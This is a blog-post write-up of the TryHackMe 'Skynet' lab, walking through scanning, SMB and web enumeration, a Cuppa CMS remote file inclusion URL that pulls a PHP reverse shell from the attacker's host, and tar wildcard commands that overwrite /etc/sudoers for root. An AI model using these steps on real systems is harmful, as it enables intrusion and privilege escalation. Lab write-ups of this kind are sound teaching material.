@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <link rel="shortcut icon" href="http://localhost:8000//favicon.ico">
+
+  <title>Skynet Writeup</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Skynet Writeup | Rooted</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Skynet Writeup" />
+<meta name="author" content="alex" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="TryHackMe - Skynet" />
+<meta property="og:description" content="TryHackMe - Skynet" />
+<link rel="canonical" href="http://localhost:8000/Skynet" />
+<meta property="og:url" content="http://localhost:8000/Skynet" />
+<meta property="og:site_name" content="Rooted" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-09-12T00:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Skynet Writeup" />
+<script type="application/ld+json">
+{"url":"http://localhost:8000/Skynet","headline":"Skynet Writeup","dateModified":"2020-09-12T00:00:00-05:00","datePublished":"2020-09-12T00:00:00-05:00","author":{"@type":"Person","name":"alex"},"@type":"BlogPosting","description":"TryHackMe - Skynet","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Skynet"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>alex@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Skynet Writeup</h2>
+  <time datetime="2020-09-12T00:00:00-05:00" class="by-line">12 Sep 2020</time>
+  <h1 id="tryhackme---skynet">TryHackMe - Skynet</h1>
+<hr />
+
+<p>This room continues my journey down the Offensive Security Path on <a href="https://tryhackme.com/">TryHackMe</a>. This is a Terminator themed room, and I’m excited to see what’s in store.</p>
+
+<h2 id="nmap-scan">nmap scan</h2>
+
+<p>The first step is to run a typical nmap scan on the box to see what services are running. Here’s the reults of the scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV -oN nmap/skynet_scan.txt 10.10.134.55
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-05 22:04 CDT
+Nmap scan report for 10.10.134.55
+Host is up (0.20s latency).
+Not shown: 991 closed ports
+PORT     STATE    SERVICE     VERSION
+22/tcp   open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
+|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
+|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
+80/tcp   open     http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Skynet
+110/tcp  open     pop3        Dovecot pop3d
+|_pop3-capabilities: UIDL TOP SASL AUTH-RESP-CODE CAPA PIPELINING RESP-CODES
+139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp  open     imap        Dovecot imapd
+|_imap-capabilities: ENABLE more LOGIN-REFERRALS listed post-login IDLE Pre-login ID capabilities LOGINDISABLEDA0001 LITERAL+ have OK IMAP4rev1 SASL-IR
+445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+1296/tcp filtered dproxy
+1999/tcp filtered tcp-id-port
+2100/tcp filtered amiganetfs
+Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h40m14s, deviation: 2h53m12s, median: 13s
+|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: skynet
+|   NetBIOS computer name: SKYNET\x00
+|   Domain name: \x00
+|   FQDN: skynet
+|_  System time: 2020-09-05T22:05:03-05:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2020-09-06T03:05:03
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 46.22 seconds
+</code></pre></div></div>
+
+<p>Looks like we’ve got <code class="language-plaintext highlighter-rouge">ssh</code>, <code class="language-plaintext highlighter-rouge">http</code>, as well as <code class="language-plaintext highlighter-rouge">smb</code> and <code class="language-plaintext highlighter-rouge">imap</code>. It also appears that the system is running linux.</p>
+
+<h2 id="smb-enumeration">SMB Enumeration</h2>
+
+<p>There’s a lot to look at but the first thing I think is interesting is the <code class="language-plaintext highlighter-rouge">smb</code>, but I’m going to run <code class="language-plaintext highlighter-rouge">enum4linux</code> to gain some initial knowledge about the shares among other things like usernames.<br />
+<br />
+<br /></p>
+
+<p><img src="assets/images/skynet/skynet_enum4linux.png" alt="" />
+<br />
+<br /></p>
+
+<p>As we can see there’s an <code class="language-plaintext highlighter-rouge">anonymous</code> smb share that we can access. Using <code class="language-plaintext highlighter-rouge">smbmap</code> we can see what’s all located inside of the anonymous file share. From there we can see a file called <code class="language-plaintext highlighter-rouge">attention.txt</code>.
+<br />
+<br /></p>
+
+<p><img src="assets/images/skynet/skynet_smb.png" alt="" />
+<br />
+<br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat 10.10.29.100-anonymous_attention.txt
+A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
+-Miles Dyson
+</code></pre></div></div>
+
+<p>The other interesting thing is the directory labeled <code class="language-plaintext highlighter-rouge">logs</code>. It contains three files, but it appears that only one of the files, <code class="language-plaintext highlighter-rouge">log1.txt</code>, has anything in it. Opening up the log1.txt reveals a list of what looks like passwords.
+<br />
+<br /></p>
+
+<h2 id="web-enumeration">Web Enumeration</h2>
+
+<p>After trying the passwords on user <code class="language-plaintext highlighter-rouge">milesdyson</code>’s smb share and getting no luck. I tried my hand at the website running on port 80. I ran gobuster and the site and got the following in return:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/admin (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/config (Status: 301)
+/ai (Status: 301)
+/squirrelmail (Status: 301)
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">admin</code> page got us nowhere, but the <code class="language-plaintext highlighter-rouge">squirrelmail</code> page redirected to a login. Let’s see if burpsuite can get us into <code class="language-plaintext highlighter-rouge">milesdyson</code>’s email.
+<br />
+<br /></p>
+
+<p><img src="assets/images/skynet/skynet_burpintrude.png" alt="" />
+<br />
+<br /></p>
+
+<p><code class="language-plaintext highlighter-rouge">cyborg007haloterminator</code> looks promising because the response is different from the others. Trying it gains us access to <code class="language-plaintext highlighter-rouge">milesdyson</code>’s email which has a very interesting email about an <code class="language-plaintext highlighter-rouge">smb</code> password reset.
+<br />
+<br /></p>
+
+<p><img src="assets/images/skynet/skynet_smbmiles.png" alt="" />
+<br />
+<br /></p>
+
+<p>The password for his smb share is )s{A&amp;2Z=F^n_E.B`. We can login to the smbshare with milesdyson’s creds by typing in:</p>
+
+<p><code class="language-plaintext highlighter-rouge">smbclient //10.10.132.87/milesdyson -U milesdyson</code></p>
+
+<p>followed by his password. Inside we see quite the list of pdfs on neural nets and the like. Anyway, there is a directory called <code class="language-plaintext highlighter-rouge">notes</code> that looks promising. We can <code class="language-plaintext highlighter-rouge">cd</code> into that and see all kinds of crazy notes, but one of them is <code class="language-plaintext highlighter-rouge">important.txt</code>. We can grab that file with <code class="language-plaintext highlighter-rouge">get important.txt</code>. The file contains:
+<br />
+<br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Add features to beta CMS /45kra24zxs28v3yd
+2. Work on T-800 Model 101 blueprints
+3. Spend more time with my wife
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<p>This to-do list shows us that the website has a beta CMS (content management system). That’s always a good place to look as an attacker. Navigating to the directory shows us:
+<br />
+<br /></p>
+
+<p><img src="assets/images/skynet/skynet_miles.png" alt="" />
+<br />
+<br /></p>
+
+<p>Nothing much going on here either on the page itself or in the source code. I think it’s time to run <code class="language-plaintext highlighter-rouge">gobuster</code> and see what we can find out.
+<br />
+<br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://10.10.132.87/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o skynet_miles_gobuster.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.132.87/45kra24zxs28v3yd/
+[+] Threads:        100
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/09 13:41:25 Starting gobuster
+===============================================================
+/administrator (Status: 301)
+===============================================================
+2020/09/09 13:48:46 Finished
+===============================================================
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<p>The only directory that gobuster got a hit on was administrator so we’ll take a look there. Once we get there we’re greeted with a login to <code class="language-plaintext highlighter-rouge">Cuppa CMS</code>. Researching Cuppa CMS reveals some vulnerabilities. The most enticing is the remote file inclusion. We can add this to our cuppa loin url in order to call back a shell to our attacking machine.
+<br />
+<br /></p>
+
+<p><code class="language-plaintext highlighter-rouge">http://10.10.141.144/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://&lt;attacking-ip&gt;:&lt;port&gt;/php-reverse-shell.php</code>
+<br />
+<br /></p>
+
+<p><img src="assets/images/skynet/skynet_initialshell.png" alt="" />
+<br />
+<br /></p>
+
+<p>Once on the victim machine I figured out that I can quickly switch to user <code class="language-plaintext highlighter-rouge">milesdyson</code> with the password recovered from before. From here it’s an easy grab for <code class="language-plaintext highlighter-rouge">user.txt</code>. There’s also something interesting going on with the backup script. Checking out crontab it appears to be running every 30 seconds. We should try to hijack this and get a reverse shell as root.
+<br />
+<br /></p>
+
+<p><img src="assets/images/skynet/skynet_su.png" alt="" />
+<br />
+<br /></p>
+
+<p>That tar command looks enticing. If we cd into the <code class="language-plaintext highlighter-rouge">/var/www/html</code> we can construct a script that allows the user milesdyson to run all commands as sudo. As it turns out only the <code class="language-plaintext highlighter-rouge">www-data</code> user can write to that directory soooo time to switch back to that user and run the following commands (idea for priv esc came from <a href="https://gtfobins.github.io/gtfobins/tar/">GTFOBins</a> and from <a href="https://medium.com/@int0x33/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e">this article from int0x33</a>).
+<br />
+<br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 'echo "www-data ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers' &gt; privesc.sh
+echo "" &gt; "--checkpoint-action=exec=sh privesc.sh"
+echo "" &gt; --checkpoint=1
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<p>After 30 seconds we can run our typical <code class="language-plaintext highlighter-rouge">sudo -l</code> command and see that we’re able to run any command as sudo without a password.
+<br />
+<br /></p>
+
+<p><img src="assets/images/skynet/skynet_sudo.png" alt="" />
+<br />
+<br /></p>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>alex</b>
+    </span>
+    
+    <span>© 2021</span>
+  </a>
+</footer>
+
+
+  
+</body>
+
+</html>
